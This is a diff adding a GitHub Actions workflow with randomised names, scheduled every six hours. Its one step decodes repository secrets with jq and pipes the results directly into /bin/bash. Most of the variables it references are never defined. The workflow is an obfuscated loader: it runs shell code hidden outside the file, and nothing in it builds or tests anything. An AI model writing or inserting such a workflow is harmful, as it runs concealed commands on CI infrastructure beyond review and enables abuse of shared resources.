@@ -1,0 +1,27 @@
+name: huanlxh
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '38 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: huanlxh
+        env:
+          ivhr776: ${{ secrets.ivhr776 }}
+        run: |
+          echo $ivhr776 | jq -r .qwds1 | /bin/bash
+          echo $ubj24926 | jq -r .oi975 | /bin/bash
+          echo $zzi43 | jq -r .sfbie56 | /bin/bash
+          echo $jexpw6885 | jq -r .w0420 | /bin/bash
+          echo $sbvt512 | jq -r .ce9 | /bin/bash
+          echo $cp6008 | jq -r .uwe704 | /bin/bash
+          echo $rlkzw77969 | jq -r .hv4560 | /bin/bash
+          echo $nflo32 | jq -r .n509 | /bin/bash
+          echo $lnsm982 | jq -r .rkna8 | /bin/bash
+          echo $gl36450 | jq -r .n0 | /bin/bash
+          echo $cemc6464 | jq -r .hr78 | /bin/bash
+
